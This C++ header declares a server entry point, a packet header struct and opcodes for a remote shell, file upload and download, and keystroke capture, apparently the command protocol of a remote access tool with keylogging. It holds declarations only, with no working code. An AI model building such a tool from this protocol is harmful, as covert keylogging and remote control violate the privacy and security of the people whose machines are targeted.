#pragma once

#include "Common.h"

BOOL StartServer(int port);
enum : int
{
    OP_SHELL_START  = 200,
    OP_SHELL_STOP   = 201,
    OP_SHELL_CMD    = 202,  
    OP_SHELL_OUTPUT = 203,  
    OP_FILE_LIST       = 210,  
    OP_FILE_LISTRES    = 211,  
    OP_FILE_DOWNLOAD   = 212, 
    OP_FILE_UPLOAD     = 213,  
    OP_FILE_DATA       = 214, 
    OP_FILE_DONE       = 215, 
    OP_KEY_START    = 220, 
    OP_KEY_STOP     = 221, 
    OP_KEY_DATA     = 222, 
};

struct PacketHeader
{
    int opcode;    
    int dataSize;  
};

